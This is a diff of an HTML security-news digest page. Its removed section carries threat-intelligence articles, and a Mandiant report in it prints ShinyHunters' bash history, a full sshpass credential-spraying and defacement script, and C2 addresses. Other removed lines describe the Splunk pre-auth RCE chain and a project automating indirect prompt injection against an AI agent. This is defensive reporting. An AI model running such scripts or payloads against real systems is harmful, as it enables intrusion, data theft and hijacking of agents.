@@ -59,47 +59,26 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-06-14</h1>
+        <h1>Security Briefing // 2026-06-15</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Chinese hackers hijack auth flow, spy on isolated network for a decade</button></li><li><button onclick="show('art-1')">Critical Splunk Enterprise Flaw Lets Attackers Run Code Without Authentication</button></li><li><button onclick="show('art-2')">JS-Tap v3: Endpoint Post-Exploitation With JavaScript Implants</button></li><li><button onclick="show('art-3')">Building an Indirect Prompt Injection Workflow</button></li><li><button onclick="show('art-4')">ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit</button></li><li><button onclick="show('art-5')">Turn specs into evals for any agent with ASSERT</button></li><li><button onclick="show('art-6')">CISA Adds Cisco, Chrome, and Arista Flaws to KEV Catalog Amid Active Exploitation</button></li><li><button onclick="show('art-7')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-8')">CISA Adds Three Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-9')">Canvas Breach Disrupts Schools & Colleges Nationwide</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Infinite Campus data breach affects 137,000 school staff accounts</button></li><li><button onclick="show('art-1')">Palo Alto Warns of Active Exploitation of PAN-OS GlobalProtect VPN Flaw</button></li><li><button onclick="show('art-2')">JS-Tap v3: Endpoint Post-Exploitation With JavaScript Implants</button></li><li><button onclick="show('art-3')">Turn specs into evals for any agent with ASSERT</button></li><li><button onclick="show('art-4')">CISA Adds Cisco, Chrome, and Arista Flaws to KEV Catalog Amid Active Exploitation</button></li><li><button onclick="show('art-5')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-6')">CISA Adds Three Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-7')">Canvas Breach Disrupts Schools & Colleges Nationwide</button></li><li><button onclick="show('art-8')">GTIG AI Threat Tracker: Distillation, Experimentation, and (Continued) Integration of AI for Adversarial Use</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Chinese hackers hijack auth flow, spy on isolated network for a decade</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/chinese-hackers-hijack-auth-flow-spy-on-isolated-network-for-a-decade/" target="_blank">Original Link</a></p>
-            <div class="content-text">Chinese hackers took control of a target organization's authentication stack and maintained persistence for 10 years, with full visibility into the administrative activity.
-Dubbed "Operation Highland," the intrusion is attributed to the Velvet Ant cyberespionage threat group, which targeted vulnerable internet-facing systems before pivoting to a network with no direct external path.
-Chinese hackers of the “Velvet Ant” activity cluster breached the isolated critical infrastructure network of a large organization and conducted cyber-espionage operations for 10 years.
-The campaign, dubbed “Operation Highland” by Sygnia researchers who discovered it, began in 2016, targeting vulnerable internet-facing systems before pivoting to an “air-gapped” environment with no direct internet connection.
-Velvet Ant’s lengthy espionage operations were documented in 2024, when Sygnia warned of a campaign [targeting F5 BIG-IP devices](https://www.bleepingcomputer.com/news/security/hackers-use-f5-big-ip-malware-to-stealthily-steal-data-for-years/) that operated undetected for three years.
-Also in 2024, [Cisco warned](https://www.bleepingcomputer.com/news/security/cisco-warns-of-nx-os-zero-day-exploited-to-deploy-custom-malware/) of a zero-day in NX-OS running on Nexus switches, which was exploited by Velvet Ant to gain access to targets.
-Velvet Ant attack chain
-The attack begins with the compromise of internet-facing servers, though the researchers don’t mention the specific product or any vulnerability used.
-Velvet Ant deployed a modified GS-Netcat reverse shell disguised as a legitimate system component that connected to a hardcoded relay domain, providing encrypted remote shell access.
-The shell achieved persistence either via a malicious systemd service or through startup script modification.
-Next, Velvet Ant installed a custom SOCKS5 proxy for network traffic tunneling, enabling it to reach internal systems that are not directly accessible from the internet.
-The proxy ran as a daemon masquerading as ‘smbd -D,’ using different filenames and ports on each host, and turning compromised servers into internal pivot points.
-The most interesting part of the attack was building a remote execution path into the isolated network.
-To achieve this, Velvet Ant modified the configuration of a compromised internet-facing Nginx server to proxy specially crafted requests to a compromised backend server.
-The backend server's Nginx configuration was also altered to forward requests to a FastCGI process (fcgiwrap) listening on a separate port.
-The FastCGI wrapper acted as an execution bridge, processing requests and launching a custom binary named ‘uptime.’
-The tool established SSH connections to systems within the isolated critical infrastructure network using parameters supplied in HTTP POST requests.
-"By chaining these modifications, Velvet Ant established a remote-execution path into the segregated environment via simple HTTP requests, with no direct connection to the critical infrastructure network ever required." - [Sygnia](https://www.sygnia.co/blog/operation-highland-velvet-ant/)
-Having established their access into the isolated environment, Velvet Ant shifted focus to long-term persistence and credential theft by targeting Linux Pluggable Authentication Modules (PAM), a set of libraries that let administrators set up methods to authenticate users.
-The attackers replaced legitimate ‘pam_unix.so’ modules with backdoored versions that accept hardcoded passwords and harvest user credentials.
-Sygnia identified nine distinct variants of the malicious PAM module, each compiled in a separate build environment, indicating a well-resourced threat actor.
-The researchers say that two of the malicious PAM modules stand out for acting as a backdoor only and for collecting credentials.
-Velvet Ant actors also replaced OpenSSH components such as ssh, sshd, and scp with trojanized versions that captured credentials, logged commands entered during SSH sessions, and stored the collected data locally for future retrieval.
-Sygnia says that by extending control to the authentication process by modifying the PAM and OpenSSH components, the threat actor had access to credentials as they were used in the target environment and could bypass the authentication flow.
-"Administrative activity became fully observable: every login; every command executed across compromised hosts. Access was no longer tied to a specific foothold but embedded into the authentication process itself," the researchers explain.
-This way, the hackers ensured their persistence despite password changes and session terminations, and reduced "the effectiveness of conventional containment measures."
-Complex cleanup
-Sygnia says even after discovering the compromise, remediating it and removing Velvet Ant from the compromised environment was particularly complicated.
-The threat actors had replaced so many critical components with custom versions that removing them was likely to break authentication, lock legitimate administrators out, and cause operational outages.
-To tackle this problem, the researchers built a testing lab to validate the binary replacement process, profiled each host, tested the results, and prepared rollback procedures before attempting the cleanup.
-Sygnia recommends that defenders treat authentication components such as PAM, OpenSSH, and Windows LSASS as critical security assets and protect them with EDR, file integrity monitoring, hardened privileged access, multi-factor authentication (MFA), and continuous monitoring for unauthorized modifications.
-Organizations should plan for offline recovery, which includes strict backups with an adequate schedule for automatically creating snapshots with immutable copies.
-The restoration process should consider testing the backups and recovery hosts running operating systems that have been validated, along with the recovery scripts.
+            <h2 class="article-title">Infinite Campus data breach affects 137,000 school staff accounts</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/infinite-campus-data-breach-affects-137-000-school-staff-accounts/" target="_blank">Original Link</a></p>
+            <div class="content-text">The ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a Salesforce data theft attack that targeted the widely used Infinite Campus K-12 student information system in March.
+Infinite Campus is an education technology (EdTech) company that provides a student information system (SIS) to over 3,200 school districts across the United States, managing data for 11 million students in 46 states.
+Although it didn't attribute the incident to a specific hacking group [when it notified customers of the breach](https://www.bleepingcomputer.com/news/security/infinite-campus-warns-of-breach-after-shinyhunters-claims-data-theft/) in March, Infinite Campus described the attacker as "part of a group known for targeting the Salesforce accounts of hundreds of companies."
+Infinite Campus also told affected customers that the exposed data contained the names and contact details for school staff and other publicly available information, but added that it had no evidence that customer databases were compromised.
+"Their target was the Infinite Campus Salesforce instance, consisting of names and contact information for school staff; the majority is directory information commonly found on school websites," it said.
+While Infinite Campus didn't share further details about the attack, the ShinyHunters data extortion group claimed responsibility for the breach on its data leak site and leaked a 1.2GB archive of documents allegedly containing Salesforce records with personally identifiable information (PII) and other internal corporate data.
+Data breach notification service Have I Been Pwned analyzed the leaked data and said today that the breach has exposed data from 137,100 accounts, including unique names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets.
+"The group subsequently published data they alleged was taken from Infinite Campus, containing 137k unique email addresses along with names, phone numbers, physical addresses and support tickets," [Have I Been Pwned said](https://haveibeenpwned.com/Breach/InfiniteCampus).
+"Infinite Campus subsequently sent notifications, advising that the exposed data largely consisted of 'names and contact information for school staff' and that 'the majority is directory information commonly found on school websites'."
+The Infinite Campus incident is very similar to the [December 2024 PowerSchool hack](https://www.bleepingcomputer.com/news/security/powerschool-starts-notifying-victims-of-massive-data-breach/), but the impact is vastly different, given that the PowerSchool breach affected [62 million students](https://www.bleepingcomputer.com/news/security/texas-sues-powerschool-after-massive-data-breach-hit-62-million-students/). The hacker behind that attack, a 19-year-old college student from Massachusetts, was also [sentenced to ](https://www.bleepingcomputer.com/news/security/powerschool-hacker-gets-sentenced-to-four-years-in-prison/)[4 years in prison](https://www.bleepingcomputer.com/news/security/powerschool-hacker-gets-sentenced-to-four-years-in-prison/) after a [guilty plea in May 2025](https://www.bleepingcomputer.com/news/security/powerschool-hacker-pleads-guilty-to-student-data-extortion-scheme/).
+ShinyHunters has [targeted many Salesforce customers](https://www.bleepingcomputer.com/tag/salesforce/) over the past year, claiming to have stolen more than 1.5 billion records after breaching hundreds of companies in the [Salesloft Drift](https://www.bleepingcomputer.com/tag/salesloft-drift/) hack and the [Salesforce Aura](https://www.google.com/url?client=internal-element-cse&cx=partner-pub-0920899300397823:3529943228&q=https://www.bleepingcomputer.com/news/security/shinyhunters-claims-ongoing-salesforce-aura-data-theft-attacks/&sa=U&ved=2ahUKEwj52NP99IiVAxUQUaQEHQkZF9UQFnoECAMQAg&usg=AOvVaw1YSYexEXKRPIiLD21-MXpD&fexp=121695405) campaign.
+More recently, the extortion group has claimed responsibility for a new data theft campaign that [exploits a zero-day vulnerability](https://www.bleepingcomputer.com/news/security/oracle-mitigates-peoplesoft-zero-day-exploited-in-data-theft-attacks/) in Oracle's PeopleSoft enterprise business software suite [to steal data from over 100 organizations](https://www.bleepingcomputer.com/news/security/oracle-peoplesoft-servers-hacked-in-shinyhunters-data-theft-attacks/), including the [University of Nottingham](https://www.bleepingcomputer.com/news/security/nottingham-university-data-breach-affects-over-450-000-students/).
 [Test every layer before attackers do](https://hubs.li/Q04jQ9z40)
 Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen.
 The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection.
@@ -112,31 +91,36 @@ Not a member yet? Register Now</div>
             <hr class="separator">
         </div>
         <div id="art-1" class="article-body">
-            <h2 class="article-title">Critical Splunk Enterprise Flaw Lets Attackers Run Code Without Authentication</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/critical-splunk-enterprise-flaw-lets.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Splunk has released security updates to address a critical security flaw in Splunk Enterprise that could be exploited to conduct unauthenticated file operations and even remote code execution.
-The vulnerability, tracked as CVE-2026-20253, is rated 9.8 on the CVSS scoring system.
-"In Splunk Enterprise versions below 10.2.4 and 10.0.7, an unauthenticated user could create or truncate arbitrary files through a PostgreSQL sidecar service endpoint," Splunk [said](https://advisory.splunk.com/advisories/SVD-2026-0603) in an alert this week.
-"The vulnerability exists because the PostgreSQL sidecar service endpoint lacks authentication controls, allowing any network-reachable user to invoke file operations without credentials."
-The issue has been addressed in the following versions -
-- Splunk Enterprise 10.0.0 to 10.0.6 - Fixed in 10.0.7
-- Splunk Enterprise 10.2.0 to 10.2.3 - Fixed in 10.2.4
-- Splunk Enterprise 10.4 - Not affected
-Splunk, which is part of Cisco, said Splunk Cloud is not impacted by the vulnerability as Postgres sidecars are not used in the product.
-What the Flaw is All About
-On Friday, watchTowr Labs [released](https://labs.watchtowr.com/why-use-app-level-auth-when-every-database-has-auth-splunk-enterprise-cve-2026-20253-pre-auth-rce/) additional technical details of CVE-2026-20253, stating it could be exploited to achieve pre-authenticated remote code execution on susceptible systems through the "/v1/postgres/recovery/backup" and "/v1/postgres/recovery/restore" endpoints.
-The attack chain works as follows -
-- Connect to an attacker-controlled database and dump its contents into an arbitrary file using the /backup endpoint
-- Load the dump of the attacker-controlled database into the local PostgreSQL instance using the /restore endpoint by including a "passfile" argument that specifies the path to a "
-[.pgpass](https://www.postgresql.org/docs/current/libpq-pgpass.html)" file ("/opt/splunk/var/packages/data/postgres/.pgpass") containing the password for the "postgres_admin" user - SQL queries defined in the database dump will get executed by Splunk's PostgreSQL instance
-An attacker could weaponize this weakness to [define a new function](https://www.postgresql.org/docs/current/sql-createfunction.html) that uses [lo_export](https://www.postgresql.org/docs/current/lo-funcs.html) - a function used to extract a BLOB from the database and save it as a file on the file system - to write attacker-controlled content to a file, following which the function gets executed during the restoration process.
-"At this point, we can authenticate, restore attacker-controlled SQL, and interact with the local database," security researchers Piotr Bazydlo and Yordan Ganchev said. "Once we could restore attacker-controlled SQL into the local PostgreSQL instance, we quickly put together a database dump template that gave us a controlled file write."
-Armed with an arbitrary file write primitive on the Splunk file system, an attacker could escalate further to remote code execution by overwriting a Python script that Splunk frequently executes (e.g., "/opt/splunk/etc/apps/splunk_secure_gateway/bin/ssg_enable_modular_input.py") to include the malicious payload.
-The entire sequence of actions is below -
-- Create a database and configure it such that a user can authenticate without a password and grant it sufficient permissions to invoke functions like lo_export
-- Use the /backup endpoint to drop a dump of the remote database onto the Splunk file system
-- Use the /restore endpoint to load the malicious database dump, trigger execution of the malicious function during the restore process, and write an attacker-controlled Python script to the Splunk file system
-Although there is no evidence of the flaw being exploited in the wild, the availability of the exploit specifics can be enough to drive threat actors to trigger opportunistic attempts. It's essential that users move quickly to apply the fixes to stay protected.
+            <h2 class="article-title">Palo Alto Warns of Active Exploitation of PAN-OS GlobalProtect VPN Flaw</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/palo-alto-warns-of-active-exploitation.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Palo Alto Networks has revealed that it has observed "active exploitation" of a recently disclosed PAN-OS vulnerability by an unknown threat actor to obtain unauthorized access to [GlobalProtect](https://docs.paloaltonetworks.com/globalprotect/getting-started/globalprotect-overview) portals.
+The vulnerability in question is [CVE-2026-0257](https://thehackernews.com/2026/05/pan-os-globalprotect-authentication.html) (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway components of PAN-OS software that could be exploited by bad actors to set up VPN connections.
+According to the network security company, the security defect could be exploited by a bad actor to bypass security controls and initiate VPN connections.
+The vulnerability has been exploited in the wild in limited attacks, with initial activity observed on May 17, 2026. It's currently unknown who is behind the exploitation efforts.
+"No post-access behavior or lateral movement has been identified as of this time," Palo Alto Networks [said](https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/). "Only a small portion of the probed devices actually established VPN sessions, resulting in gateway-connected events."
+The company has also released indicators of compromise (IoCs) associated with the activity -
+-
+IP addresses -
+- 23.128.228[.]6
+- 104.207.144[.]154
+- 146.19.216[.]119
+- 146.19.216[.]120
+- 146.19.216[.]125
+- 179.43.172[.]213
+- 185.195.232[.]139
+- 198.12.106[.]60
+- 202.144.192[.]47
+-
+Host Names and MAC Addresses -
+- aa:bb:cc:dd:ee:ff
+- 00:11:22:33:44:55
+- WINDOWS-LAPTOP-001
+- DESKTOP-GP01
+- GP-CLIENT
+Palo Alto Networks is also urging customers to search GlobalProtect logs for successful gateway-connected events that match the following hard-coded client configuration values from a proof-of-concept (PoC) exploit -
+- endpoint_os_version : Microsoft Windows 10 Pro 64-bit
+- source_user_info.domain : empty
+Late last month, the U.S. Cybersecurity and Infrastructure Security Agency (CSIA) added CVE-2026-0257 to its Known Exploited Vulnerabilities (KEV) catalog, ordering Federal Civilian Executive Branch (FCEB) agencies to mitigate the flaw by June 1, 2026.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
@@ -190,234 +174,6 @@ Please let me know if you run into bugs. There will be bugs. This is a very larg
             <hr class="separator">
         </div>
         <div id="art-3" class="article-body">
-            <h2 class="article-title">Building an Indirect Prompt Injection Workflow</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/06/11/building-an-indirect-prompt-injection-workflow/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>TL;DR: This post covers how I used OpenAI’s Codex to automate the generation, testing, and refinement of indirect prompt injection payloads against an agentic system using Sonnet 4.5 and 4.6 models on Amazon Bedrock. Introduction This project began as a relatively straightforward effort. I wanted to build a basic AI chatbot, evaluate it against AI-specific [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/06/11/building-an-indirect-prompt-injection-workflow/">Building an Indirect Prompt Injection Workflow</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/" target="_blank">Original Link</a></p>
-            <div class="content-text">ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit
-Mandiant
-Introduction
-Mandiant and Google Threat Intelligence Group (GTIG) have identified an active compromise and extortion campaign attributed to UNC6240 (ShinyHunters) targeting Oracle PeopleSoft application infrastructure. The activity was observed between May 27, 2026, and June 9, 2026 and is consistent with the exploitation of [CVE-2026-35273](https://www.oracle.com/security-alerts/alert-cve-2026-35273.html), a critical remote code execution vulnerability (CVSS 9.8) in the Environment Management component. The exploitation of this vulnerability directly aligns with the observed targeting of Environment Management Hub (PSEMHUB) endpoints. Because this activity predates Oracle's June 10, 2026 advisory, the vulnerability was exploited as a zero-day.
-Upon becoming aware of active scanning and exploitation, we initiated notifications to over 100 global organizations whose IP addresses correlated with potentially vulnerable endpoints. Most of these organizations were based in the United States, and 68 percent operated within the higher education sector. Subsequently, public reports by @nahamike01 on X highlighted open attacker directories on the staging servers, allowing GTIG to perform a detailed triage of the threat actor's operations.
-The attacker staging environments hosted customized MeshCentral agents masquerading as legitimate cloud endpoints, which they used to run administrative command queries and deploy a custom lateral movement and defacement script, [victim_abbreviation]_fanout.sh
-. This campaign directly correlates with subsequent data leaks of stolen organization data published on the ShinyHunters Data Leak Site (DLS) on June 9, 2026.
-We recommend that organizations running Oracle PeopleSoft take the following immediate actions to best defend themselves. Additional remediation and hardening guidance is included later in this post.
-Threat Detail & Campaign Overview
-On June 9 2026, [public threat reports](https://x.com/nahamike01/status/2064529246178210220?s=46&t=DT1t7WC3zIgctMHBQDruCQ) highlighted open attacker directories. GTIG triaged five sequential IP addresses: 142.11.200.186
-, 142.11.200.187
-, 142.11.200.188
-, 142.11.200.189
-, and 142.11.200.190
-. These systems were hosting Python SimpleHTTP servers on port 8888, exposing directory contents that included staging materials, customized agents, and attacker command histories.
-The staging infrastructure hosted pre-configured Windows MeshCentral agent binaries disguised as Microsoft Azure services, specifically named meshagent32-azure-ops.exe
-, meshagent64-azure-ops.exe
-, and meshagent64-v2.exe
-. MeshCentral is an open-source remote management server; its agent is software that runs on remote devices to allow for remote management across various operating systems, including Windows, Linux, macOS, and FreeBSD. Static analysis indicates these agents were hardcoded to establish communication with the command and control (C2) server wss://azurenetfiles.net:443/agent.ashx
-. The domain azurenetfiles.net
-was chosen to mimic legitimate Microsoft Azure NetApp Files endpoints, a common masquerading tactic. An unconfigured Linux meshagent
-binary was also staged, suggesting that the threat actors passed parameters dynamically via the command line during deployment.
-Global Notification Response Campaign
-Prior to the discovery of the open staging directories, we began an effort to alert over 100 exposed organizations to assist in restricting access to vulnerable endpoints. These organizations are significantly concentrated in the Higher Education sector; 68 percent are academic institutions, including universities and colleges worldwide.
-While several organizations successfully blocked the activity or remediated the vulnerabilities, others experienced compromise, resulting in stolen data being published on the ShinyHunters DLS.
-Technical Analysis & Command History
-The exposed .bash_history
-file, which was identical across all five staging hosts, outlines the server configuration and administrative actions. The technical narrative begins with the configuration of the staging environment. On May 27, 2026, at 22:14 UTC, the attackers installed the MeshCentral remote management server (version 1.1.59) to establish their C2 staging environment. Shortly after, at 22:25 UTC, they installed the acme-client
-npm package to automate the provisioning of Let's Encrypt SSL certificates for the masquerading domain "azurenetfiles.net
-". The attackers interacted with compromised systems using the MeshCentral command-line interface utility meshctrl.js
-.
-The command history shows the threat actors performing targeted reconnaissance within compromised internal networks. They mapped Oracle PeopleSoft configurations by inspecting mount points, checking the process scheduler configuration file psappsrv.cfg
-, and reading WebLogic server XML configurations (config.xml
-). The session log ends with the attackers establishing an outbound SSH connection from their staging system to 176.120.22.24
-, which hosts the public clearnet mirror of the ShinyHunters DLS.
-An analysis of the exposed command history reveals the key administrative and malicious operations performed by the threat actors on the staging servers (timestamps were not available in every case):
-1. Staging Infrastructure Setup:
--
-May 27, 2026, 22:14 UTC: Installed MeshCentral (v1.1.59) and 22:25 UTC: Installed "acme-client" to establish the C2 staging environment and automate SSL certificate provisioning for
-azurenetfiles.net
-. -
-Staged the compiled Windows agent binaries (
-meshagent32-azure-ops.exe
-, etc.) designed to communicate back to the C2 address:wss://azurenetfiles.net:443/agent.ashx
-. -
-May 29, 2026, 18:46 UTC: The attackers checked for the availability of the "authenticode" tool on the staging system using the command
-npm list global authenticode
-. This command would return any npm package with a name starting in 'authenticode', such asauthenticode-sign
-, used for signing binaries, orauthenticode
-, used for examining metadata on a file.
-2. Targeted Internal Reconnaissance:
--
-Leveraged the MeshCentral CLI utility meshctrl.js to execute administrative command queries on compromised remote endpoints: hostname; id.
--
-Mapped Oracle PeopleSoft system configurations by inspecting the process scheduler configuration file (
-psappsrv.cfg
-) to extract machine names and IP addresses:
-grep -hE '\''^[[:space:]]*Address=|^[[:space:]]*HostName='\'' /u01/app/psoft/ps_config_homes/csprd/appserv/prcs/psappsrv.cfg 2>/dev/null | head -80
--
-Audited network configurations and active mounts on compromised hosts:
-mount | grep -E "psoft|ps_config|nfs"
-. -
-Mapped internal subnet hosts by querying local hosts tables:
-cat /etc/hosts | grep -E "[redacted_victim_string]"
-. -
-Inspected WebLogic XML configurations (
-config.xml
-) to map internal application servers.
-3. Lateral Movement & Script Propagation:
--
-Wrote the lateral propagation script
-[victim_abbreviation]_fanout.sh
-via a heredoc to/tmp
-on the staging host. -
-Triggered the execution of the propagation script on compromised hosts using the MeshCentral command execution feature:
-node meshctrl.js RunCommand --loginuser admin --loginpass '[password]' --id '[agent_id]' --run 'bash /tmp/[victim_abbreviation]_fanout.sh'
--
-Verified propagation success by running remote checks for the defacement marker file
-README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT
-.
-4. Exfiltration & DLS Connection:
--
-Compressed exfiltrated directories containing stolen data using
-zstd
-:
-pv -s "$(du -sb exfil | awk '{print $1}')" | zstd -3 -T0 -o exfil.tar.zst
-- Concluded operations by establishing an outbound SSH connection from the staging host to
-176.120.22.24
-, the IP address hosting the public mirror of the ShinyHunters Data Leak Site.
-Figure 1: ShinyHunters DLS Post showing Peoplesoft victim added June 9, 2026
-Propagation Script & Lateral Movement
-As observed in the .bash_history
-log, the threat actors wrote a propagation script named [victim_abbreviation]_fanout.sh
-directly to the /tmp
-directory of the compromised system. This script automates SSH credential spraying against internal hosts by parsing hostnames from the local /etc/hosts
-file matching a specific naming pattern. The script attempts authentication using a hardcoded list of common administrative and application-specific usernames and passwords.
-Upon establishing a successful SSH session, the script copies a defacement and extortion marker file named README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT
-into the WebLogic and Process Scheduler directories. This staging and deployment activity directly correlates with the publication of stolen archives on the ShinyHunters DLS on June 9, 2026.
-The redacted contents of the propagation script [victim_abbreviation]_fanout.sh
-are as follows:
-set +e
-SRC="/u01/app/psoft/ps_config_homes/csprd/webserv/CSPRD02/README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT"
-NAME="README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT"
-BASE="/u01/app/psoft/ps_config_homes/csprd"
-export PATH=/usr/bin:/bin
-# hosts from /etc/hosts — internal PS nodes only
-HOSTS=$(grep -E '[redacted_victim_host_pattern]|csprd[0-9]' /etc/hosts | awk '{print $2}' | grep -v '^#' | sort -u)
-echo "HOSTS=$(echo $HOSTS | wc -w)"
-PWDS="[redacted_passwords]"
-USERS="[redacted_usernames]"
-OK=0; FAIL=0; SKIP=0
-for h in $HOSTS; do
-echo "=== $h ==="
-copied=0
-for u in $USERS; do
-for p in $PWDS; do
-sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=no $u@$h "hostname" >/dev/null 2>&1 && {
-for dest in $BASE/webserv/CSPRD $BASE/webserv/CSPRD02 $BASE/appserv/prcs; do
-sshpass -p "$p" ssh -o StrictHostKeyChecking=no $u@$h "test -d $dest && mkdir -p $dest && cat > $dest/$NAME" < "$SRC" 2>/dev/null && echo " OK $dest ($u)" && OK=$((OK+1)) && copied=1
-done
-break 2
-}
-done
-done
-if [ $copied -eq 0 ]; then
-# try key-based
-ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=yes $USER@$h "hostname" >/dev/null 2>&1 && copied=1 || true
-if [ $copied -eq 0 ]; then echo " FAIL ssh"; FAIL=$((FAIL+1)); fi
-fi
-done
-# local paths on this host
-for dest in $BASE/webserv/CSPRD $BASE/webserv/CSPRD02 $BASE/appserv/prcs; do
-if [ -d "$dest" ]; then cp -f "$SRC" "$dest/$NAME" && chmod 644 "$dest/$NAME" && echo "LOCAL OK $dest"; fi
-done
-echo SUMMARY ok=$OK fail=$FAIL
-find $BASE -name "$NAME" -type f 2>/dev/null
-Remediation and Hardening
-To defend against this campaign, we recommend that organizations running Oracle PeopleSoft immediately implement the following security measures:
-Network Isolation & WAF Rules
--
-Endpoint Access Restrictions: If you cannot disable the EMHub Service, immediately block external network access to the sensitive endpoints
-/PSEMHUB/*
-(specifically/PSEMHUB/hub
-) and/PSIGW/HttpListeningConnector
-at the network perimeter or firewall level. Relying solely on Web Application Firewall (WAF) body-inspection rules is insufficient, as these controls can be bypassed. -
-Non-Breaking Action: Restricting these endpoints is considered non-breaking for standard end-user operations. The Environment Management Hub (EMHub) and the Integration Broker Listening Connector are administrative or system-to-system components and are not required for the core user-facing PeopleSoft Internet Architecture (PIA) browser sessions.
-Log & Endpoint Monitoring
--
-Access Log Analysis: Audit the PIA WebLogic access logs for HTTP
-POST
-requests directed at/PSEMHUB/hub
-and/PSIGW/HttpListeningConnector
-originating from external or untrusted source IP addresses. -
-SSRF Detection: Analyze requests to
-/PSIGW/HttpListeningConnector
-for loopback IP addresses (such as127.0.0.1
-,localhost
-, or::1
-) or internal IP ranges passed within request headers or parameters. This is a common method for attackers to perform Server-Side Request Forgery (SSRF) to bypass access controls.
-Network Telemetry
--
-Outbound Port 445 Monitoring: Monitor outbound firewall logs and NetFlow data for outbound SMB traffic (TCP port 445) originating from PeopleSoft hosts to untrusted, external internet destinations. The exploit chain may coerce the system into making outbound connections in an attempt to capture Windows machine-account NetNTLM hashes.
-Host-Level Auditing & Filesystem Checks
-Conduct a thorough forensic audit of the web-tier filesystem on PeopleSoft hosts for indicators of compromise:
--
-Webshell Detection: Scan the WebLogic web application directory
-<PS_CFG_HOME>/webserv/<domain>/applications/peoplesoft/PSEMHUB.war/
-for any unexpected*.jsp
-files that are not part of the shipped product. -
-Unauthorized Staging: Inspect the staging directory
-.../PSEMHUB.war/envmetadata/transactions/
-for unauthorized folders, files, or binary drops. -
-Unexpected Directories: Look for unexpected directories named
-logs
-,persistantstorage
-, orscratchpad
-under the PSEMHUB directories. -
-XMLDecoder Persistence: Check
-<docroot>/envmetadata/data/environment/
-for recently created or modified.xml
-files, which may be leveraged by threat actors to execute remote code via XMLDecoder upon application restart.
-In alignment with Oracle’s security advisory, we consider the implementation of these mitigations to be a high-priority risk reduction measure and strongly recommend immediate action to address the identified exposure. As this vulnerability is remotely exploitable without authentication and may result in remote code execution, organizations must remain on actively supported versions and apply all Critical Patch Updates, Critical Security Patch Updates, and Security Alerts without delay. Review the full [Oracle Security Alert Advisory - CVE-2026-35273](https://www.oracle.com/security-alerts/alert-cve-2026-35273.html) for complete details.
-Indicators of Compromise (IOCs)
-To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a [GTI collection](https://www.virustotal.com/gui/collection/50ac0ffbc9ecf4559949faa026a412c9bb57e81d3ae0714a4dcd25b4fec35105) for registered users.
-Staging & C2 Network Indicators
--
-142.11.200.186
--
-142.11.200.187
--
-142.11.200.188
--
-142.11.200.189
--
-142.11.200.190
--
-azurenetfiles.net
-Staging Payloads & Attacker Files
-Google Security Operations (SecOps)
-SecOps customers will have access to the following pending-deployment rules. Once fully deployed, these rules will be available under the Mandiant Frontline Threats rule pack:
--
-Oracle PeopleSoft Configuration Inspection
--
-Oracle PeopleSoft Suspicious JSP File Write to PSEMHUB
--
-Sshpass Interactive File Deployment
--
-Data Archiving or Compression via Zstd Utility
--
-MeshCentral Command Execution via Meshctrl</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
             <h2 class="article-title">Turn specs into evals for any agent with ASSERT</h2>
             <p class="source-link">Source: Microsoft Security Blog | <a href="https://commandline.microsoft.com/assert-written-intent-executable-evals/" target="_blank">Original Link</a></p>
